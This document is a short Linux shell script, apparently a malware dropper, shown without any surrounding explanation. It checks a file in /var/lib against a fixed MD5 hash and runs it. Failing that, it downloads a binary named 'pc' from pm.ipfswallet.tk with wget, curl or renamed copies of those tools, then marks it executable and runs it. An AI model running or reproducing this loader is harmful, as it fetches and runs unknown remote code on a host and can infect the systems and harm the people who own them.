PATH=$PATH:/usr/bin:/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/sbin

cd /var/lib


if [ -x "/usr/bin/md5sum" -o -x "/bin/md5sum" ];then
	sum=`md5sum pc|grep 7dfcb7d46ca8afcaf7e92fa3f75775ff|grep -v grep |wc -l`
	if [ $sum -eq 1 ]; then
		chmod +x /var/lib/pc
		/var/lib/pc
		exit 0
	fi
fi

/bin/rm -rf /var/lib/pc
if [ -x "/usr/bin/wget"  -o  -x "/bin/wget" ]; then
   wget -c http://pm.ipfswallet.tk/pc -O /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc
elif [ -x "/usr/bin/curl"  -o  -x "/bin/curl" ]; then
   curl -fs http://pm.ipfswallet.tk/pc -o /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc
elif [ -x "/usr/bin/get"  -o  -x "/bin/get" ]; then
   get -c http://pm.ipfswallet.tk/pc -O /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc
elif [ -x "/usr/bin/cur"  -o  -x "/bin/cur" ]; then
   cur -fs http://pm.ipfswallet.tk/pc -o /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc
else
   url -fs http://pm.ipfswallet.tk/pc -o /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc
fi
